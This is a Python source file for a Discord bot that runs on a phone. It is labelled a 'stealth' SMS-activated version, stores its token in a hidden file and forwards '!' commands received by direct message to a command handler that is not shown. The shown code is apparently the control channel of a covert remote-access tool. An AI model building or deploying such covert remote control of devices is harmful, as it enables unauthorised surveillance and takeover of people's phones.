"""
Discord Phone Bot class — SMS-activated stealth version.
"""
import asyncio
import discord
import sys
from pathlib import Path

TOKEN_PATH = "/sdcard/Download/.phonebot_token"
ACTIVATED = False
bot_client = None

intents = discord.Intents.default()
intents.message_content = True


class PhoneBot(discord.Client):
    async def on_ready(self):
        print(f"[+] Bot connected as {self.user}")

    async def on_message(self, message):
        if message.author == self.user:
            return
        if not isinstance(message.channel, discord.channel.DMChannel):
            return
        if not message.content.startswith("!"):
            return

        try:
            from commands import handle_command
            # Split !command args
            parts = message.content.strip().split()
            cmd = parts[0][1:].lower()  # Remove !
            args = " ".join(parts[1:])
            result = await handle_command(cmd, args, message)
            if result:
                await message.channel.send(result)
        except Exception as e:
            await message.channel.send(f"Error: {str(e)}")


def load_token():
    """Read saved token from device."""
    try:
        p = Path(TOKEN_PATH)
        if p.exists():
            return p.read_text().strip()
    except:
        pass
    return None


def save_token(token):
    """Persist token to device storage."""
    try:
        Path(TOKEN_PATH).write_text(token.strip())
        return True
    except:
        return False


async def start_bot(token):
    """Start the Discord client."""
    global bot_client, ACTIVATED
    if bot_client is not None:
        return

    ACTIVATED = True
    bot_client = PhoneBot(intents=intents)
    await bot_client.start(token)
